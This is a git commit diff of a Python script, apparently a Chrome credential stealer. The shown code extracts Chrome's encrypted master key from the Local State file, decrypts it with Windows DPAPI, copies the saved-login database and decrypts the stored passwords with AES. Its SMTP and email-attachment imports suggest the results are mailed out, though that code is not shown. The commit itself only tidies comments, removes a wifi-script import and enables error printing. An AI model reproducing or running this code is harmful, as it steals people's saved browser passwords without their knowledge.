f59fb982d53ecd2cf747ea306cf2d565382a0576
Mohit Dwivedi <118814602+DarkImpact1@users.noreply.github.com>
2024-07-11 17:54:57 +0530

    Update chrome_script.py

--- chrome_script.py
+++ chrome_script.py
@@ -12,19 +12,16 @@ import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.application import MIMEApplication
-import wifi_script
-#GLOBAL CONSTANT
+
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
 CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
 
 def get_secret_key():
     try:
-        #(1) Get secretkey from chrome local state
         with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
             local_state = f.read()
             local_state = json.loads(local_state)
         secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        #Remove suffix DPAPI
         secret_key = secret_key[5:] 
         secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
         return secret_key
@@ -41,24 +38,19 @@ def generate_cipher(aes_key, iv):
 
 def decrypt_password(ciphertext, secret_key):
     try:
-        #(3-a) Initialisation vector for AES decryption
         initialisation_vector = ciphertext[3:15]
-        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
-        #Encrypted password is 192 bits
         encrypted_password = ciphertext[15:-16]
-        #(4) Build the cipher to decrypt the ciphertext
         cipher = generate_cipher(secret_key, initialisation_vector)
         decrypted_pass = decrypt_payload(cipher, encrypted_password)
         decrypted_pass = decrypted_pass.decode()  
         return decrypted_pass
     except Exception as e:
-        # print("%s"%str(e))
+        print("%s"%str(e))
         print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
         return ""
     
 def get_db_connection(chrome_path_login_db):
     try:
-        # print(chrome_path_login_db)
         shutil.copy2(chrome_path_login_db, "Loginvault.db") 
         return sqlite3.connect("Loginvault.db")
     except Exception as e:
